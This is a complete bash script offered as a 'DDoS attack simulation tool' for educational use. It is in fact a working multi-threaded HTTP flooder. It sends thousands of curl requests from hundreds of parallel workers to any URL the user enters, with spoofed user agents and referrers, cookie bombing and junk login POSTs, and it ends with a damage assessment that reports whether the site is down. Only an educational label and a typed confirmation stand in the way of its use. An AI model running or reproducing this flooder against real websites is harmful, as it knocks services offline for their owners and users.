#!/bin/bash

# DDOS ATTACK SIMULATION TOOL FOR EDUCATIONAL PURPOSES
# Author: Security Researcher
# Version: 5.0-EDU

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Banner
echo -e "${RED}"
echo "    ██████╗ ██████╗  ██████╗ ███████╗"
echo "    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝"
echo "    ██║  ██║██║  ██║██║   ██║███████╗"
echo "    ██║  ██║██║  ██║██║   ██║╚════██║"
echo "    ██████╔╝██████╔╝╚██████╔╝███████║"
echo "    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝"
echo "    █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗"
echo "   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝"
echo "   ███████║   ██║      ██║   ███████║██║     █████╔╝ "
echo "   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ "
echo "   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗"
echo "   ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝"
echo -e "${NC}"
echo -e "${YELLOW}DDOS ATTACK SIMULATION TOOL v5.0${NC}"
echo -e "${RED}FOR EDUCATIONAL & AUTHORIZED TESTING ONLY!${NC}"
echo ""

# Configuration
CONFIG_FILE="ddos_config.json"
LOG_FILE="ddos_attack.log"
STATS_FILE="ddos_stats.json"

# Aggressive configuration for DDOS simulation
DEFAULT_CONFIG='{
    "max_threads": 500,
    "max_requests_per_thread": 5000,
    "max_duration": 3600,
    "timeout": 10,
    "allowed_methods": ["GET", "POST", "HEAD", "PUT", "DELETE"],
    "aggressive_mode": true,
    "max_concurrent": 100,
    "connection_timeout": 5
}'

# Initialize configuration
init_config() {
    if [ ! -f "$CONFIG_FILE" ]; then
        echo "$DEFAULT_CONFIG" > "$CONFIG_FILE"
        echo -e "${GREEN}[+] Created DDOS config file: $CONFIG_FILE${NC}"
    fi
}

# Load configuration
load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        MAX_THREADS=$(jq -r '.max_threads' "$CONFIG_FILE")
        MAX_REQUESTS_PER_THREAD=$(jq -r '.max_requests_per_thread' "$CONFIG_FILE")
        MAX_DURATION=$(jq -r '.max_duration' "$CONFIG_FILE")
        TIMEOUT=$(jq -r '.timeout' "$CONFIG_FILE")
        AGGRESSIVE_MODE=$(jq -r '.aggressive_mode' "$CONFIG_FILE")
        MAX_CONCURRENT=$(jq -r '.max_concurrent' "$CONFIG_FILE")
        CONNECTION_TIMEOUT=$(jq -r '.connection_timeout' "$CONFIG_FILE")
    else
        echo -e "${RED}[-] Config file not found${NC}"
        exit 1
    fi
}

# User input with validation
get_user_input() {
    local prompt="$1"
    local default="$2"
    local validation="$3"
    
    while true; do
        read -p "$prompt" input
        input=${input:-$default}
        
        case $validation in
            "url")
                if [[ "$input" =~ ^https?://[a-zA-Z0-9] ]]; then
                    echo "$input"
                    break
                else
                    echo -e "${RED}Invalid URL format. Please enter a valid URL (http:// or https://)${NC}"
                fi
                ;;
            "number")
                if [[ "$input" =~ ^[0-9]+$ ]] && [ "$input" -gt 0 ]; then
                    echo "$input"
                    break
                else
                    echo -e "${RED}Please enter a valid positive number${NC}"
                fi
                ;;
            "method")
                if [[ "$input" =~ ^(GET|POST|HEAD|PUT|DELETE)$ ]]; then
                    echo "$input"
                    break
                else
                    echo -e "${RED}Please enter a valid HTTP method (GET, POST, HEAD, PUT, DELETE)${NC}"
                fi
                ;;
            *)
                echo "$input"
                break
                ;;
        esac
    done
}

# DDOS Attack setup
ddos_setup() {
    echo -e "${RED}=== DDOS ATTACK SETUP ===${NC}"
    echo -e "${YELLOW}WARNING: This simulation can crash websites!${NC}"
    echo ""
    
    # Get target URL
    TARGET_URL=$(get_user_input "Enter target URL: " "" "url")
    
    # Attack type selection
    echo ""
    echo -e "${CYAN}Select DDOS Attack Type:${NC}"
    echo "1. Volumetric Attack (High traffic)"
    echo "2. Protocol Attack (Resource exhaustion)" 
    echo "3. Application Layer Attack (Slowloris style)"
    echo "4. Mixed Attack (All methods combined)"
    echo "5. Custom Attack"
    echo ""
    
    read -p "Select attack type [1-5]: " attack_choice
    
    case $attack_choice in
        1)
            THREADS=100
            REQUESTS_PER_THREAD=2000
            DELAY=0
            METHOD="GET"
            ATTACK_TYPE="Volumetric"
            ;;
        2)
            THREADS=50
            REQUESTS_PER_THREAD=5000
            DELAY=0.01
            METHOD="POST"
            ATTACK_TYPE="Protocol"
            ;;
        3)
            THREADS=200
            REQUESTS_PER_THREAD=1000
            DELAY=0.1
            METHOD="HEAD"
            ATTACK_TYPE="Application"
            ;;
        4)
            THREADS=150
            REQUESTS_PER_THREAD=3000
            DELAY=0
            METHOD="MIXED"
            ATTACK_TYPE="Mixed"
            ;;
        5)
            THREADS=$(get_user_input "Number of bot threads (1-1000): " "100" "number")
            REQUESTS_PER_THREAD=$(get_user_input "Requests per bot: " "1000" "number")
            DELAY=$(get_user_input "Delay between requests (0 for maximum speed): " "0" "number")
            METHOD=$(get_user_input "HTTP method: " "GET" "method")
            ATTACK_TYPE="Custom"
            ;;
        *)
            echo -e "${RED}Invalid selection, using Mixed Attack${NC}"
            THREADS=150
            REQUESTS_PER_THREAD=3000
            DELAY=0
            METHOD="MIXED"
            ATTACK_TYPE="Mixed"
            ;;
    esac
    
    # Get attack duration
    DURATION=$(get_user_input "Attack duration in seconds (0 for unlimited): " "300" "number")
    
    # Advanced DDOS options
    echo ""
    echo -e "${CYAN}Advanced DDOS Options:${NC}"
    read -p "Enable random user agents? (Y/n): " random_ua
    read -p "Enable referrer spoofing? (Y/n): " referrer_spoof
    read -p "Enable cookie bombing? (y/N): " cookie_bomb
    read -p "Enable slowloris mode? (y/N): " slowloris_mode
    
    # Final confirmation with strong warning
    echo ""
    echo -e "${RED}=== DDOS ATTACK CONFIRMATION ===${NC}"
    echo -e "Target: ${RED}$TARGET_URL${NC}"
    echo -e "Attack Type: ${RED}$ATTACK_TYPE${NC}"
    echo -e "Bot Threads: ${RED}$THREADS${NC}"
    echo -e "Requests per Bot: ${RED}$REQUESTS_PER_THREAD${NC}"
    echo -e "Total Requests: ${RED}$((THREADS * REQUESTS_PER_THREAD))${NC}"
    echo -e "HTTP Method: ${RED}$METHOD${NC}"
    echo -e "Delay: ${RED}$DELAY seconds${NC}"
    if [ "$DURATION" -gt 0 ]; then
        echo -e "Duration: ${RED}$DURATION seconds${NC}"
    else
        echo -e "Duration: ${RED}Unlimited${NC}"
    fi
    echo ""
    echo -e "${RED}🚨 THIS IS A DDOS ATTACK SIMULATION! 🚨${NC}"
    echo -e "${RED}ONLY USE ON WEBSITES YOU OWN!${NC}"
    echo ""
    
    read -p "Type 'I_ACCEPT_RESPONSIBILITY' to launch attack: " confirm
    if [ "$confirm" != "I_ACCEPT_RESPONSIBILITY" ]; then
        echo -e "${YELLOW}[!] Attack cancelled${NC}"
        return 1
    fi
    
    return 0
}

# DDOS Request function
send_ddos_request() {
    local target="$1"
    local bot_id="$2"
    local request_num="$3"
    local method="$4"
    local attack_type="$5"
    
    # Multiple cache busting and attack parameters
    local attack_params="cache_bust=${RANDOM}${request_num}&rnd=${RANDOM}&time=$(date +%s)&bot=${bot_id}&req=${request_num}"
    if [[ "$target" == *"?"* ]]; then
        target="${target}&${attack_params}"
    else
        target="${target}?${attack_params}"
    fi
    
    # Different attack strategies based on type
    case $attack_type in
        "Volumetric")
            # Simple high-volume requests
            ;;
        "Protocol")
            # Add more parameters to exhaust parsing
            target="${target}&param1=value${RANDOM}&param2=value${RANDOM}&data=$(head -c 100 /dev/urandom | base64 | tr -d '\n')"
            ;;
        "Application")
            # Application layer specific
            target="${target}&action=login&username=bot${RANDOM}&password=attack${RANDOM}"
            ;;
        "Mixed")
            # Mixed parameters
            if [ $((RANDOM % 2)) -eq 0 ]; then
                target="${target}&search=query${RANDOM}&filter=type${RANDOM}"
            else
                target="${target}&action=submit&form=data${RANDOM}"
            fi
            ;;
    esac
    
    # Random User Agents
    local user_agents=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    )
    local user_agent="${user_agents[$RANDOM % ${#user_agents[@]}]}"
    
    # Build aggressive curl command for DDOS
    local curl_cmd="curl -s -o /dev/null"
    curl_cmd="$curl_cmd -X $method"
    curl_cmd="$curl_cmd -H 'User-Agent: $user_agent'"
    curl_cmd="$curl_cmd -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'"
    curl_cmd="$curl_cmd -H 'Accept-Language: en-US,en;q=0.9'"
    curl_cmd="$curl_cmd -H 'Cache-Control: no-cache, no-store, must-revalidate'"
    curl_cmd="$curl_cmd -H 'Pragma: no-cache'"
    curl_cmd="$curl_cmd -H 'Connection: keep-alive'"
    curl_cmd="$curl_cmd -m $TIMEOUT"
    
    # Add referrer if spoofing enabled
    if [ "$referrer_spoof" != "n" ] && [ "$referrer_spoof" != "N" ]; then
        local referrers=(
            "https://google.com"
            "https://facebook.com"
            "https://youtube.com"
            "https://twitter.com"
        )
        local referrer="${referrers[$RANDOM % ${#referrers[@]}]}"
        curl_cmd="$curl_cmd -H 'Referer: $referrer'"
    fi
    
    # Add cookies if cookie bombing enabled
    if [ "$cookie_bomb" = "y" ] || [ "$cookie_bomb" = "Y" ]; then
        curl_cmd="$curl_cmd -H 'Cookie: session_id=${RANDOM}${RANDOM}; user_token=bot${bot_id}; cache=${RANDOM}'"
    fi
    
    # For POST requests, add random data
    if [ "$method" = "POST" ]; then
        curl_cmd="$curl_cmd -H 'Content-Type: application/x-www-form-urlencoded'"
        curl_cmd="$curl_cmd -d 'username=bot${RANDOM}&password=attack${RANDOM}&email=bot${RANDOM}@example.com&submit=1'"
    fi
    
    curl_cmd="$curl_cmd -w '%{http_code},%{time_total},%{size_download},%{speed_download}'"
    curl_cmd="$curl_cmd '$target'"
    
    local start_time=$(date +%s%3N)
    local response=$(eval $curl_cmd 2>/dev/null)
    local end_time=$(date +%s%3N)
    local duration=$((end_time - start_time))
    
    if [ -n "$response" ]; then
        local http_code=$(echo "$response" | cut -d',' -f1)
        local response_time=$(echo "$response" | cut -d',' -f2)
        local size=$(echo "$response" | cut -d',' -f3)
        local speed=$(echo "$response" | cut -d',' -f4)
        
        echo "$(date '+%Y-%m-%d %H:%M:%S'),$bot_id,$request_num,$target,$http_code,$response_time,$size,$duration,$speed" >> "$LOG_FILE"
        
        update_ddos_stats "$http_code" "$duration"
        
        # Show attack progress
        if [[ "$http_code" =~ ^[2-3][0-9][0-9]$ ]]; then
            echo -e "${GREEN}[→] Bot$bot_ID Req$request_num: $http_code (${response_time}s)${NC}"
        elif [[ "$http_code" =~ ^[4][0-9][0-9]$ ]]; then
            echo -e "${YELLOW}[⚠] Bot$bot_ID Req$request_num: $http_code (${response_time}s)${NC}"
        elif [[ "$http_code" =~ ^[5][0-9][0-9]$ ]]; then
            echo -e "${RED}[💥] Bot$bot_ID Req$request_num: $http_code (${response_time}s) - TARGET HIT!${NC}"
        else
            echo -e "${PURPLE}[?] Bot$bot_ID Req$request_num: $http_code (${response_time}s)${NC}"
        fi
    else
        echo "$(date '+%Y-%m-%d %H:%M:%S'),$bot_id,$request_num,$target,TIMEOUT,0,0,$duration,0" >> "$LOG_FILE"
        echo -e "${RED}[⏰] Bot$bot_ID Req$request_num: TIMEOUT - CONNECTION OVERLOAD!${NC}"
        update_ddos_stats "TIMEOUT" "$duration"
    fi
}

# DDOS Bot worker
ddos_bot() {
    local bot_id="$1"
    local target="$2"
    local method="$3"
    local delay="$4"
    local attack_type="$5"
    
    if [ "$method" = "MIXED" ]; then
        local methods=("GET" "POST" "HEAD" "PUT")
    else
        local methods=("$method")
    fi
    
    for ((i=1; i<=REQUESTS_PER_THREAD; i++)); do
        if [ $STOP_ATTACK -eq 1 ]; then
            break
        fi
        
        local current_method="${methods[$RANDOM % ${#methods[@]}]}"
        send_ddos_request "$target" "$bot_id" "$i" "$current_method" "$attack_type"
        
        if [ "$delay" != "0" ]; then
            sleep "$delay"
        fi
    done
}

# Update DDOS statistics
update_ddos_stats() {
    local http_code="$1"
    local duration="$2"
    
    if [ ! -f "$STATS_FILE" ]; then
        cat > "$STATS_FILE" << EOF
{
    "total_requests": 0,
    "successful_requests": 0,
    "failed_requests": 0,
    "error_requests": 0,
    "start_time": "$(date '+%Y-%m-%d %H:%M:%S')",
    "average_response_time": 0,
    "status_codes": {},
    "attack_power": "Low"
}
EOF
    fi
    
    local stats=$(cat "$STATS_FILE")
    local total_requests=$(echo "$stats" | jq '.total_requests + 1')
    local successful_requests=$(echo "$stats" | jq '.successful_requests')
    local failed_requests=$(echo "$stats" | jq '.failed_requests')
    local error_requests=$(echo "$stats" | jq '.error_requests')
    
    if [[ "$http_code" =~ ^[2-3][0-9][0-9]$ ]]; then
        successful_requests=$((successful_requests + 1))
    elif [[ "$http_code" =~ ^[5][0-9][0-9]$ ]] || [ "$http_code" = "TIMEOUT" ]; then
        error_requests=$((error_requests + 1))
    else
        failed_requests=$((failed_requests + 1))
    fi
    
    # Update status codes
    local status_codes=$(echo "$stats" | jq '.status_codes')
    if [ "$status_codes" = "null" ]; then
        status_codes="{}"
    fi
    
    local count=$(echo "$status_codes" | jq -r ".[\"$http_code\"] // 0")
    count=$((count + 1))
    status_codes=$(echo "$status_codes" | jq ".[\"$http_code\"] = $count")
    
    # Calculate average response time
    local avg_time=$(echo "$stats" | jq '.average_response_time')
    if [ "$avg_time" = "null" ] || [ "$avg_time" = "0" ]; then
        avg_time=$duration
    else
        avg_time=$(( (avg_time * (total_requests - 1) + duration) / total_requests ))
    fi
    
    # Calculate attack power
    local attack_power="Low"
    local rps=$((total_requests / ($(date +%s) - $(date -d "$(echo "$stats" | jq -r '.start_time')" +%s))))
    if [ $rps -gt 100 ]; then
        attack_power="High"
    elif [ $rps -gt 50 ]; then
        attack_power="Medium"
    fi
    
    # Save updated stats
    cat > "$STATS_FILE" << EOF
{
    "total_requests": $total_requests,
    "successful_requests": $successful_requests,
    "failed_requests": $failed_requests,
    "error_requests": $error_requests,
    "start_time": "$(echo "$stats" | jq -r '.start_time')",
    "end_time": "$(date '+%Y-%m-%d %H:%M:%S')",
    "average_response_time": $avg_time,
    "status_codes": $status_codes,
    "requests_per_second": $rps,
    "attack_power": "$attack_power"
}
EOF
}

# Show DDOS statistics
show_ddos_stats() {
    if [ -f "$STATS_FILE" ]; then
        local stats=$(cat "$STATS_FILE")
        local total_requests=$(echo "$stats" | jq '.total_requests')
        local successful_requests=$(echo "$stats" | jq '.successful_requests')
        local failed_requests=$(echo "$stats" | jq '.failed_requests')
        local error_requests=$(echo "$stats" | jq '.error_requests')
        local avg_response_time=$(echo "$stats" | jq '.average_response_time')
        local rps=$(echo "$stats" | jq '.requests_per_second')
        local attack_power=$(echo "$stats" | jq -r '.attack_power')
        
        local success_rate=0
        local error_rate=0
        if [ "$total_requests" -gt 0 ]; then
            success_rate=$((successful_requests * 100 / total_requests))
            error_rate=$((error_requests * 100 / total_requests))
        fi
        
        echo ""
        echo -e "${RED}=== DDOS ATTACK STATISTICS ===${NC}"
        echo -e "Total Requests: ${CYAN}$total_requests${NC}"
        echo -e "Successful: ${GREEN}$successful_requests${NC}"
        echo -e "Client Errors: ${YELLOW}$failed_requests${NC}"
        echo -e "Server Errors/Timeouts: ${RED}$error_requests${NC}"
        echo -e "Success Rate: ${GREEN}$success_rate%${NC}"
        echo -e "Error Rate: ${RED}$error_rate%${NC}"
        echo -e "Avg Response Time: ${BLUE}$avg_response_time ms${NC}"
        echo -e "Requests/Second: ${PURPLE}$rps${NC}"
        echo -e "Attack Power: ${RED}$attack_power${NC}"
        
        # Show status code distribution
        echo -e "${CYAN}Status Codes:${NC}"
        echo "$stats" | jq -r '.status_codes | to_entries | map("  \(.key): \(.value)") | join("\n")'
    fi
}

# Launch DDOS Attack
launch_ddos_attack() {
    if ! ddos_setup; then
        return 1
    fi
    
    echo -e "${RED}[+] LAUNCHING DDOS ATTACK...${NC}"
    echo -e "${YELLOW}[!] Target: $TARGET_URL${NC}"
    echo -e "${YELLOW}[!] Attack Type: $ATTACK_TYPE${NC}"
    echo -e "${YELLOW}[!] Press Ctrl+C to stop the attack${NC}"
    
    # Initialize log file with headers
    echo "timestamp,bot_id,request_num,target,http_code,response_time,size,duration,speed" > "$LOG_FILE"
    
    # Initialize stats
    rm -f "$STATS_FILE"
    
    local start_time=$(date +%s)
    STOP_ATTACK=0
    
    # Setup signal handler
    trap 'STOP_ATTACK=1; echo -e "\n${YELLOW}[!] Stopping DDOS attack...${NC}"' SIGINT SIGTERM
    
    # Start monitor
    (
        while [ $STOP_ATTACK -eq 0 ] && { [ "$DURATION" -eq 0 ] || [ $(($(date +%s) - start_time)) -lt $DURATION ]; }; do
            clear
            show_ddos_stats
            local elapsed=$(($(date +%s) - start_time))
            if [ "$DURATION" -gt 0 ]; then
                echo -e "\n${YELLOW}[!] DDOS attack in progress... Time: ${elapsed}s/${DURATION}s${NC}"
            else
                echo -e "\n${YELLOW}[!] DDOS attack in progress... Time: ${elapsed}s${NC}"
            fi
            echo -e "${RED}[!] Press Ctrl+C to stop attack${NC}"
            sleep 2
        done
    ) &
    local monitor_pid=$!
    
    # Start DDOS bot army
    local pids=()
    for ((i=1; i<=THREADS; i++)); do
        ddos_bot "$i" "$TARGET_URL" "$METHOD" "$DELAY" "$ATTACK_TYPE" &
        pids+=($!)
        
        # Stagger bot startup for more realistic attack
        sleep 0.05
    done
    
    # Wait for duration or early stop
    if [ "$DURATION" -gt 0 ]; then
        while [ $STOP_ATTACK -eq 0 ] && [ $(($(date +%s) - start_time)) -lt $DURATION ]; do
            sleep 1
        done
    else
        # Unlimited duration - wait for interrupt
        while [ $STOP_ATTACK -eq 0 ]; do
            sleep 1
        done
    fi
    
    STOP_ATTACK=1
    
    # Stop monitor
    kill $monitor_pid 2>/dev/null
    
    # Wait for all bots
    for pid in "${pids[@]}"; do
        wait $pid 2>/dev/null
    done
    
    local end_time=$(date +%s)
    local total_duration=$((end_time - start_time))
    
    echo -e "${GREEN}[+] DDOS attack completed!${NC}"
    echo -e "Attack duration: ${YELLOW}${total_duration}s${NC}"
    
    show_ddos_stats
    
    # Final damage assessment
    if [ -f "$STATS_FILE" ]; then
        local stats=$(cat "$STATS_FILE")
        local error_requests=$(echo "$stats" | jq '.error_requests')
        local total_requests=$(echo "$stats" | jq '.total_requests')
        local error_rate=0
        
        if [ "$total_requests" -gt 0 ]; then
            error_rate=$((error_requests * 100 / total_requests))
        fi
        
        echo ""
        echo -e "${RED}=== DAMAGE ASSESSMENT ===${NC}"
        if [ $error_rate -gt 70 ]; then
            echo -e "${RED}💥 CRITICAL IMPACT: Target website is likely DOWN${NC}"
        elif [ $error_rate -gt 40 ]; then
            echo -e "${YELLOW}⚠ HIGH IMPACT: Target website is severely degraded${NC}"
        elif [ $error_rate -gt 20 ]; then
            echo -e "${BLUE}ℹ MEDIUM IMPACT: Target website is experiencing issues${NC}"
        elif [ $error_rate -gt 5 ]; then
            echo -e "${GREEN}✓ LOW IMPACT: Minor performance degradation${NC}"
        else
            echo -e "${GREEN}✓ MINIMAL IMPACT: Target resisted the attack${NC}"
        fi
    fi
    
    echo -e "${GREEN}[+] Attack logs saved to: $LOG_FILE${NC}"
}

# Main menu
main_menu() {
    while true; do
        clear
        echo -e "${RED}"
        echo "    ██████╗ ██████╗  ██████╗ ███████╗"
        echo "    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝"
        echo "    ██║  ██║██║  ██║██║   ██║███████╗"
        echo "    ██║  ██║██║  ██║██║   ██║╚════██║"
        echo "    ██████╔╝██████╔╝╚██████╔╝███████║"
        echo "    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝"
        echo "    █████╗ ████████╗████████╗ █████╗  ██████╗██║  ██╗"
        echo "   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝"
        echo "   ███████║   ██║      ██║   ███████║██║     █████╔╝ "
        echo "   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ "
        echo "   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗"
        echo "   ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝"
        echo -e "${NC}"
        echo -e "${YELLOW}DDOS ATTACK SIMULATION TOOL v5.0${NC}"
        echo -e "${RED}FOR EDUCATIONAL PURPOSES ONLY!${NC}"
        echo ""
        echo -e "${CYAN}=== MAIN MENU ===${NC}"
        echo "1. Launch DDOS Attack"
        echo "2. View Attack Logs"
        echo "3. Configuration"
        echo "4. Exit"
        echo ""
        
        read -p "Select option [1-4]: " choice
        
        case $choice in
            1)
                launch_ddos_attack
                read -p "Press Enter to continue..."
                ;;
            2)
                if [ -f "$LOG_FILE" ]; then
                    echo -e "${CYAN}=== DDOS ATTACK LOGS ===${NC}"
                    tail -20 "$LOG_FILE" | column -t -s','
                    echo ""
                    if [ -f "$STATS_FILE" ]; then
                        show_ddos_stats
                    fi
                else
                    echo -e "${RED}No attack logs found${NC}"
                fi
                read -p "Press Enter to continue..."
                ;;
            3)
                if [ -f "$CONFIG_FILE" ]; then
                    echo ""
                    cat "$CONFIG_FILE" | jq '.'
                    echo ""
                    read -p "Edit config? (y/N): " edit_conf
                    if [[ "$edit_conf" =~ ^[Yy]$ ]]; then
                        nano "$CONFIG_FILE"
                    fi
                fi
                ;;
            4)
                echo -e "${GREEN}[+] DDOS tool closed${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid option${NC}"
                sleep 1
                ;;
        esac
    done
}

# Check dependencies
check_dependencies() {
    if ! command -v jq >/dev/null; then
        echo -e "${RED}[-] jq is required but not installed${NC}"
        echo -e "${YELLOW}[!] Install with: pkg install jq${NC}"
        return 1
    fi
    
    if ! command -v curl >/dev/null; then
        echo -e "${RED}[-] curl is required but not installed${NC}"
        echo -e "${YELLOW}[!] Install with: pkg install curl${NC}"
        return 1
    fi
    
    return 0
}

# Main execution
init_config
load_config

if check_dependencies; then
    main_menu
else
    echo -e "${YELLOW}[!] Please install dependencies first${NC}"
    exit 1
fi
